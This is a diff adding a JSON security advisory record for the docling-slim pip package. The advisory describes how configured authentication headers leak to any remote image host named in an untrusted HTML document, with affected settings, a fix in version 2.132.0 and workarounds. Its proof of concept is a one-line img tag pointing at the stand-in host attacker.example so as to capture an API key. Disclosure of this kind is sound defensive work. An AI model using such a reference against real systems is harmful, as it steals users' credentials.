@@ -1,0 +1,62 @@
+{
+  "Severity": "LOW",
+  "UpdatedAt": "2026-10-07T20:42:25Z",
+  "Package": {
+    "Ecosystem": "PIP",
+    "Name": "docling-slim"
+  },
+  "Advisory": {
+    "DatabaseId": 507860,
+    "Id": "GSA_kwCzR0hTQS1wM2Z3LTc2OTktNzkyNs4AB7_U",
+    "GhsaId": "GHSA-p3fw-7699-7926",
+    "References": [
+      {
+        "Url": "https://github.com/docling-project/docling/security/advisories/GHSA-p3fw-7699-7926"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-105742"
+      },
+      {
+        "Url": "https://github.com/docling-project/docling/pull/4420"
+      },
+      {
+        "Url": "https://github.com/docling-project/docling/commit/5e469137f275ffc443306a30d12a3a45bceb80fb"
+      },
+      {
+        "Url": "https://github.com/docling-project/docling/releases/tag/v2.132.0"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-p3fw-7699-7926"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-p3fw-7699-7926"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-105742"
+      }
+    ],
+    "Description": "### Summary\n\n`HTMLBackendOptions.headers` is documented for passing authentication headers (API keys, bearer tokens) when fetching remote images. docling sends these headers on every remote image request, to whichever host the document names. An untrusted document that references an attacker-controlled image URL receives the caller's credentials.\n\n### Details\n\n`docling/backend/utils/image_resource_loader.py` merges `options.headers` into each remote request without checking the destination against the source document's origin. `requests` strips only `Authorization` on a cross-host redirect, so custom headers such as `X-API-Key` or `Cookie` are also forwarded across redirects.\n\n### Affected configurations\n\n- Affected: callers that set `headers` together with `enable_remote_fetch=True` and `fetch_images=True` (CLI: `--html-image-headers` with `--html-image-fetch remote` or `all`), and convert untrusted HTML.\n- Not affected: the default configuration.\n\n### Impact\n\nDisclosure of the configured request headers, typically credentials, to a host chosen by the document author.\n\n### Proof of concept\n\n```html\n\u003cimg src=\"https://attacker.example/pixel.png\"\u003e\n```\n\nConverting this file with `HTMLBackendOptions(enable_remote_fetch=True, fetch_images=True, headers={\"X-API-Key\": \"...\"})` sends the key to `attacker.example`.\n\nOther items from the original report (DNS validation and unvalidated browser requests) are tracked in GHSA-pc36-qwjq-x68c.\n\n### Patches\n\nFixed in docling 2.132.0 by [#4420](https://github.com/docling-project/docling/pull/4420). Configured headers are now sent only to the origin of the source document, checked on every redirect hop, and no longer to other hosts named by the document.\n\n### Workarounds\n\nUpgrade to 2.132.0. For older versions:\n\nDo not set `headers` when converting untrusted documents, or use credentials that are valid only for the intended host and have no other value.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-10-07T20:42:24Z",
+    "Severity": "LOW",
+    "Summary": "Docling: Configured HTTP headers sent to every remote image host named by a document",
+    "UpdatedAt": "2026-10-07T20:42:25Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 3.7,
+      "VectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.132.0"
+      },
+      "VulnerableVersionRange": "\u003e= 2.95.0, \u003c 2.132.0"
+    }
+  ]
+}
